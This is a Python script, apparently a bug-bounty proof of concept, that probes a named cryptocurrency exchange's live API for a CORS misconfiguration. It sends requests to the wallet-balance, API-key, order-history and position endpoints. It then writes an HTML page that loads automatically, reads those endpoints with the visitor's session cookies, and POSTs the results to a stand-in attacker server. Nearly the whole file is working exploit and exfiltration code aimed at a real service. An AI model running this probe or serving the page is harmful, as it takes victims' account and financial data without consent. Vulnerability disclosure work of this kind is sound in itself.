#!/usr/bin/env python3
"""
CORS Exploit PoC Generator

This will:
1. Verify CORS misconfiguration on READ endpoints (GET)
2. Generate HTML PoC that attacker can host
3. Test if sensitive data can be stolen
"""
import requests
import json

BASE_URL = "https://api.bybit.com"
requests.packages.urllib3.disable_warnings()

print("="*80)
print("CORS EXPLOIT VERIFICATION & PoC GENERATION")
print("="*80)

# Test on sensitive GET endpoints
sensitive_endpoints = [
    "/v5/account/wallet-balance?accountType=UNIFIED",
    "/v5/user/query-api",
    "/v5/order/history?category=linear&limit=10",
    "/v5/position/list?category=linear",
    "/v5/account/transaction-log?accountType=UNIFIED",
]

print("\n[1] Verifying CORS Misconfiguration on READ Endpoints")
print("-" * 80)

vulnerable = []

for endpoint in sensitive_endpoints:
    try:
        r = requests.get(
            f"{BASE_URL}{endpoint}",
            headers={"Origin": "https://attacker.com"},
            verify=False,
            timeout=5
        )
        
        acao = r.headers.get('Access-Control-Allow-Origin', '')
        acac = r.headers.get('Access-Control-Allow-Credentials', '')
        
        print(f"\n{endpoint}")
        print(f"  ACAO: {acao}")
        print(f"  ACAC: {acac}")
        
        if acao and acac == 'true':
            print(f"  üö® VULNERABLE!")
            vulnerable.append(endpoint)
            
            # Check if returns data (even without auth)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get('retCode') == 0:
                        print(f"  üö®üö®üö® RETURNS DATA WITHOUT AUTH!")
                except:
                    pass
    except Exception as e:
        print(f"  Error: {e}")

if not vulnerable:
    print("\n‚ùå No vulnerable endpoints found.")
    exit()

print(f"\n\n‚úÖ Found {len(vulnerable)} vulnerable endpoints!")

# Generate PoC HTML
print("\n[2] Generating PoC HTML")
print("=" * 80)

poc_html = '''<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC - Bybit</title>
</head>
<body>
    <h1>CORS Vulnerability PoC</h1>
    <p>This page will attempt to steal victim's Bybit data using CORS misconfiguration.</p>
    <div id="result"></div>
    
    <script>
        // Attacker's server to receive stolen data
        const ATTACKER_SERVER = "https://attacker.com/log";
        
        // Target endpoints
        const endpoints = [
'''

for ep in vulnerable[:3]:  # Limit to first 3 for PoC
    poc_html += f'            "https://api.bybit.com{ep}",\n'

poc_html += '''        ];
        
        async function exploit() {
            const results = {};
            
            for (const url of endpoints) {
                try {
                    const response = await fetch(url, {
                        method: 'GET',
                        credentials: 'include',  // Send victim's cookies
                        headers: {
                            // If Bybit uses API keys in headers from web app
                            // 'X-BAPI-API-KEY': localStorage.getItem('apiKey')
                        }
                    });
                    
                    const data = await response.json();
                    results[url] = data;
                    
                    // Display stolen data
                    document.getElementById('result').innerHTML += 
                        `<h3>${url}</h3><pre>${JSON.stringify(data, null, 2)}</pre>`;
                    
                } catch (e) {
                    results[url] = {error: e.message};
                }
            }
            
            // Send stolen data to attacker
            fetch(ATTACKER_SERVER, {
                method: 'POST',
                body: JSON.stringify(results)
            });
        }
        
        // Auto-execute on page load
        window.onload = exploit;
    </script>
</body>
</html>
'''

# Save PoC
with open('/media/sf_vremen/hackerone/Bybit Fintech Ltd/cors_poc.html', 'w') as f:
    f.write(poc_html)

print("PoC HTML saved to: cors_poc.html")
print("\nTo test:")
print("1. Host this HTML on https://attacker.com")
print("2. Victim (logged into Bybit) visits https://attacker.com")
print("3. JavaScript steals victim's data via CORS")
print("4. Attacker receives stolen data at /log endpoint")

print("\n" + "="*80)
print("IMPACT:")
print("- Attacker can read victim's wallet balance")
print("- Attacker can read victim's API keys/settings")
print("- Attacker can read victim's trading history")
print("- Attacker can read victim's positions")
print("\nThis is a HIGH severity vulnerability!")
print("="*80)
